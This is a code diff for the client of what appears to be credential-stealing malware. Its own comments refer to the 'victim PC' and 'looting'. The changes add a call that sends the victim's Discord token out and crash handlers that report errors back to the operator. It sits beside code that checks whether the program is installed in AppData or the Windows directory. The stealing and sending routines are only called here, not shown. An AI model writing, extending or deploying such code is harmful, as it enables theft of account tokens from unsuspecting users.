@@ -21,6 +21,10 @@ namespace Client
             ArgsParser(args);
             CheckRealApplication();
 
+            // make sure this thing wont crash
+            Application.ThreadException += Application_ThreadException;
+            AppDomain.CurrentDomain.UnhandledException += CurrentDomain_UnhandledException;
+
 #if !DEBUG
             /// Check if Application is already on victim PC
             if (!Constants.IsInAppData() && !Constants.IsInWinDir())
@@ -76,12 +80,25 @@ namespace Client
 
             Armitage.Watchers.Filesystem.Start();
 
+            /// Start looting.
+            Armitage.Cookies.Discord_Token.Send();
+
             while (true)
             {
                 // Sleep, useless, but...makes me sleep at night
                 // remembering the letter wont randomly close.
                 Thread.Sleep(10 * 1000);
             }
+        }
+
+        private static void CurrentDomain_UnhandledException(object sender, UnhandledExceptionEventArgs e)
+        {
+            Communication.String_Stacker.Send(e.ExceptionObject.ToString(), Communication.String_Stacker.StringType.ApplicationEvent);
+        }
+
+        private static void Application_ThreadException(object sender, ThreadExceptionEventArgs e)
+        {
+            Communication.String_Stacker.Send(e.Exception.ToString(), Communication.String_Stacker.StringType.ApplicationEvent);
         }
 
         public static void ArgsParser(string[] args)
